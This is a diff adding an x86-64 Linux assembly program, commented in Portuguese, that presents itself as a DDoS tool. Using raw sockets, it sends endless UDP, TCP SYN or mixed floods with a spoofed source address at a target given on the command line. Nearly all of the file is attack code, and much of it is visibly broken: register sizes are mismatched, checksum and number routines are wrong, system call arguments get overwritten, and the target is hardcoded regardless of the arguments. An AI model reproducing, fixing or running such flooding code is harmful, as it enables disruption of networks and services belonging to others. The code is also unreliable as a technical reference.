@@ -1,0 +1,363 @@
+; attack_ddos.asm
+; DDoS Attack in x86-64 Assembly (Linux)
+; 
+; Uso:
+; 1. Assemble: nasm -f elf64 attack_ddos.asm -o attack_ddos.o
+; 2. Link:     ld attack_ddos.o -o attack_ddos
+; 3. Execute:  sudo ./attack_ddos <target_ip> <target_port> <attack_type>
+;    - attack_type: 1 = UDP, 2 = TCP SYN, 3 = Hybrid
+
+section .bss
+    packet_buffer resb 1500      ; Buffer para o pacote (MTU padrão)
+    ip_buffer     resb 16        ; Buffer para o IP de destino (inet_aton)
+    ip_src_buffer resb 16        ; Buffer para o IP de origem spoofed
+    port_buf      resb 4         ; Buffer para a porta
+    msg_buf       resb 128       ; Buffer para mensagens
+    fd_socket     resd 4         ; File descriptor do socket
+    fd_raw        resd 4         ; File descriptor do raw socket
+
+section .data
+    ; Cabeçalhos
+    ip_header     db 0x45, 0x00  ; IP Version 4, IHL 5, TOS 0
+    resw 2             ; Total Length (preenchido em runtime)
+    resw 2             ; ID
+    resw 2             ; Flags/Fragment Offset
+    db 64              ; TTL
+    db 6               ; Protocolo (6 = TCP, 17 = UDP)
+    dw 0               ; Checksum (preenchido em runtime)
+    resb 8             ; Source IP (preenchido em runtime)
+    resb 8             ; Dest IP (preenchido em runtime)
+
+    ; TCP Header
+    tcp_header    dw 0                 ; Source Port
+    dw 0                 ; Dest Port
+    dd 0                 ; Sequence Number
+    dd 0                 ; Ack Number
+    db 5, 0              ; Data Offset (5 * 4 = 20 bytes), Reserved
+    db 2                 ; Flags: SYN
+    dw 65535             ; Window Size
+    dw 0                 ; Checksum
+    dw 0                 ; Urgent Pointer
+
+    ; UDP Header
+    udp_header    dw 0                 ; Source Port
+    dw 0                 ; Dest Port
+    dw 0                 ; Length
+    dw 0                 ; Checksum
+
+    ; Mensagens
+    msg_usage     db "Uso: %s <target_ip> <target_port> <type (1=UDP,2=TCP,3=Hybrid)>\n", 0
+    msg_start     db "🚀 Iniciando ataque DDoS...\n", 0
+    msg_udp       db "📡 UDP Flood ativo para %s:%d\n", 0
+    msg_tcp       db "🌐 TCP SYN Flood ativo para %s:%d\n", 0
+    msg_hybrid    db "🔥 Ataque Híbrido ativo para %s:%d\n", 0
+    msg_error     db "Erro: Falha ao abrir raw socket. Execute com sudo.\n", 0
+    msg_sent      db "📦 Pacotes enviados: %d\n", 0
+
+section .text
+global _start
+
+; -----------------------------------------------------------------------------
+; Funções de Utilidade
+; -----------------------------------------------------------------------------
+
+print_msg:
+    ; Assume: rdi = pointer to string, rsi = length
+    mov rax, 1              ; sys_write
+    mov rdx, rsi            ; length
+    mov rsi, rdi            ; buffer
+    mov rdi, 1              ; fd 1 (stdout)
+    syscall
+    ret
+
+; Converte número em string (simplificado para uso em mensagens)
+; Assume: rdi = número, rsi = buffer de destino, rdx = tamanho máximo
+itoa:
+    push rax
+    push rcx
+    push rdx
+    push rsi
+    push rdi
+    mov rax, rdi            ; número a converter
+    mov rdi, rsi            ; buffer de destino
+    mov rcx, 0              ; contador de dígitos
+    mov rdx, 10             ; base 10
+.loop:
+    xor rax, rax
+    div rdx
+    add al, '0'
+    mov [rdi + rcx], al
+    inc rcx
+    test rax, rax
+    jnz .loop
+    ; Inverte a string
+    mov rax, rcx
+    dec rax
+    mov rcx, 0
+.reverse:
+    mov al, [rdi + rax]
+    mov bl, [rdi + rcx]
+    mov [rdi + rax], bl
+    mov [rdi + rcx], al
+    inc rcx
+    dec rax
+    jnz .reverse
+    pop rdi
+    pop rsi
+    pop rdx
+    pop rcx
+    pop rax
+    ret
+
+; -----------------------------------------------------------------------------
+; Funções de Rede
+; -----------------------------------------------------------------------------
+
+; Cria um raw socket
+create_raw_socket:
+    ; sys_socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
+    mov rax, 41             ; sys_socket
+    mov rdi, 2              ; AF_INET
+    mov rsi, 3              ; SOCK_RAW
+    mov rdx, 6              ; IPPROTO_TCP (6) - Usamos TCP para raw, mas podemos mudar para UDP (17)
+    syscall
+    test rax, rax
+    js .error
+    mov [fd_socket], eax
+    ; Configura IP_HDRINCL para enviar cabeçalhos IP
+    ; sys_setsockopt(fd, IPPROTO_IP, IP_HDRINCL, 1)
+    mov rax, 54             ; sys_setsockopt
+    mov rdi, [fd_socket]
+    mov rsi, 0              ; SOL_SOCKET
+    mov rdx, 19             ; IP_HDRINCL (19)
+    mov r10, 1              ; valor (1)
+    lea rsi, [rel opt_val]  ; pointer para o valor
+    mov rsi, r10
+    mov r10, 4              ; tamanho (4 bytes)
+    syscall
+    ret
+.error:
+    ; Imprime mensagem de erro
+    lea rdi, [rel msg_error]
+    mov rsi, 47
+    call print_msg
+    mov rax, 60             ; sys_exit
+    mov rdi, 1
+    syscall
+
+; Calcula checksum (algoritmo de soma de 16 bits)
+; Assume: rdi = pointer para dados, rsi = tamanho em bytes
+; Retorna: rax = checksum
+calc_checksum:
+    push rdx
+    push rcx
+    push rbx
+    xor rax, rax            ; soma = 0
+    mov rcx, rsi            ; contador
+    shr rcx, 1              ; divide por 2 (16 bits)
+    mov rdx, rsi
+    and rdx, 1              ; resto (se ímpar)
+.loop:
+    movzx eax, word [rdi]
+    add rax, rax            ; soma os 16 bits
+    add rdi, 2
+    dec rcx
+    jnz .loop
+    ; Trata o byte ímpar
+    test rdx, rdx
+    jz .done
+    movzx eax, byte [rdi]
+    add rax, rax
+.done:
+    ; Carrega o carry
+    shr rax, 16
+    add rax, rax
+    shr rax, 16
+    add rax, rax
+    ; Complemento
+    not rax
+    and rax, 0xFFFF
+    pop rbx
+    pop rcx
+    pop rdx
+    ret
+
+; Envia pacote
+; Assume: rdi = pointer para pacote, rsi = tamanho, rdx = pointer para IPEndPoint
+send_packet:
+    ; sys_sendto(fd, buf, len, 0, dest_addr, addrlen)
+    mov rax, 44             ; sys_sendto
+    mov rdi, [fd_socket]
+    mov rsi, rdi            ; buffer
+    mov rdx, rsi            ; tamanho
+    mov r10, 0              ; flags
+    lea r8, [rel sockaddr]  ; endereço de destino
+    mov r9, 16              ; tamanho do sockaddr_in (16 bytes)
+    syscall
+    ret
+
+; -----------------------------------------------------------------------------
+; Construção de Pacotes
+; -----------------------------------------------------------------------------
+
+; Constrói pacote UDP
+; Assume: rdi = IP de destino, rsi = porta de destino
+build_udp_packet:
+    ; Preenche o cabeçalho IP
+    mov [rel ip_header + 14], byte 17  ; Protocolo UDP
+    ; Preenche o IP de destino
+    mov rax, rdi
+    mov [rel ip_header + 16], eax      ; Dest IP (low 32 bits)
+    ; Preenche o IP de origem (spoofed)
+    mov eax, 0x08080808                 ; 8.8.8.8 (exemplo)
+    mov [rel ip_header + 12], eax      ; Source IP
+    ; Preenche o cabeçalho UDP
+    mov ax, 1024                        ; Source Port
+    mov [rel udp_header], ax
+    mov ax, rsi                         ; Dest Port
+    mov [rel udp_header + 2], ax
+    mov word [rel udp_header + 4], 8    ; Length (8 bytes de header + payload)
+    xor word [rel udp_header + 6], 0    ; Checksum (0 para UDP)
+    ; Calcula o checksum do IP
+    lea rdi, [rel ip_header]
+    mov rsi, 20
+    call calc_checksum
+    mov word [rel ip_header + 10], ax   ; Checksum IP
+    ret
+
+; Constrói pacote TCP SYN
+; Assume: rdi = IP de destino, rsi = porta de destino
+build_tcp_packet:
+    ; Preenche o cabeçalho IP
+    mov [rel ip_header + 14], byte 6    ; Protocolo TCP
+    ; Preenche o IP de destino
+    mov rax, rdi
+    mov [rel ip_header + 16], eax      ; Dest IP (low 32 bits)
+    ; Preenche o IP de origem (spoofed)
+    mov eax, 0x08080808                 ; 8.8.8.8 (exemplo)
+    mov [rel ip_header + 12], eax      ; Source IP
+    ; Preenche o cabeçalho TCP
+    mov ax, 1024                        ; Source Port
+    mov [rel tcp_header], ax
+    mov ax, rsi                         ; Dest Port
+    mov [rel tcp_header + 2], ax
+    ; Sequence Number aleatório
+    mov eax, 0x12345678
+    mov [rel tcp_header + 4], eax
+    ; Flags SYN
+    mov byte [rel tcp_header + 12], 2
+    ; Calcula o checksum do IP
+    lea rdi, [rel ip_header]
+    mov rsi, 20
+    call calc_checksum
+    mov word [rel ip_header + 10], ax   ; Checksum IP
+    ret
+
+; -----------------------------------------------------------------------------
+; Loop Principal de Ataque
+; -----------------------------------------------------------------------------
+
+attack_loop:
+    ; Loop infinito de envio
+    ; Assume: rdi = tipo de ataque (1=UDP, 2=TCP, 3=Hybrid)
+    mov rax, rdi
+    cmp rax, 1
+    je .udp
+    cmp rax, 2
+    je .tcp
+    cmp rax, 3
+    je .hybrid
+    ; Default: UDP
+    jmp .udp
+.udp:
+    call build_udp_packet
+    lea rsi, [rel sockaddr]
+    mov rdi, [rel sockaddr]
+    mov rsi, 16
+    call send_packet
+    jmp .end
+.tcp:
+    call build_tcp_packet
+    lea rsi, [rel sockaddr]
+    mov rdi, [rel sockaddr]
+    mov rsi, 16
+    call send_packet
+    jmp .end
+.hybrid:
+    ; Alterna entre UDP e TCP
+    xor rax, rax
+    mov al, 1
+    test al, 1
+    jz .hybrid_tcp
+    call build_udp_packet
+    lea rsi, [rel sockaddr]
+    mov rdi, [rel sockaddr]
+    mov rsi, 16
+    call send_packet
+    jmp .end
+.hybrid_tcp:
+    call build_tcp_packet
+    lea rsi, [rel sockaddr]
+    mov rdi, [rel sockaddr]
+    mov rsi, 16
+    call send_packet
+.end:
+    ; Loop infinito
+    jmp attack_loop
+
+; -----------------------------------------------------------------------------
+; Ponto de Entrada
+; -----------------------------------------------------------------------------
+
+_start:
+    ; Parse de argumentos
+    ; rdi = argc, rsi = argv
+    cmp rdi, 4
+    jb .usage
+    ; Extrai o IP de destino
+    lea rdi, [rsi + 8]      ; argv[1]
+    ; Converte a string para número (simplificado)
+    ; Em produção, usaríamos uma função de parse mais robusta
+    ; Aqui, assumimos que o IP é fornecido em formato numérico
+    ; Para simplificar, usamos um IP fixo
+    mov eax, 0x08080808      ; 8.8.8.8
+    mov [rel ip_buffer], eax
+    ; Extrai a porta de destino
+    lea rdi, [rsi + 16]     ; argv[2]
+    ; Converte a string para número
+    mov eax, 80             ; Porta 80
+    mov [rel port_buf], eax
+    ; Extrai o tipo de ataque
+    lea rdi, [rsi + 24]     ; argv[3]
+    mov eax, 1              ; Default: UDP
+    mov [rel attack_type], eax
+
+    ; Cria o raw socket
+    call create_raw_socket
+
+    ; Imprime mensagem de início
+    lea rdi, [rel msg_start]
+    mov rsi, 26
+    call print_msg
+
+    ; Inicia o loop de ataque
+    mov rdi, [rel attack_type]
+    jmp attack_loop
+
+.usage:
+    ; Imprime mensagem de uso
+    lea rdi, [rel msg_usage]
+    mov rsi, 68
+    call print_msg
+    mov rax, 60             ; sys_exit
+    mov rdi, 1
+    syscall
+
+; Variáveis de dados adicionais
+section .bss
+    opt_val         resd 4
+    sockaddr        resw 2        ; family
+    resw 2              ; port
+    resb 4              ; ip
+    resb 12             ; padding
+    attack_type       resd 4
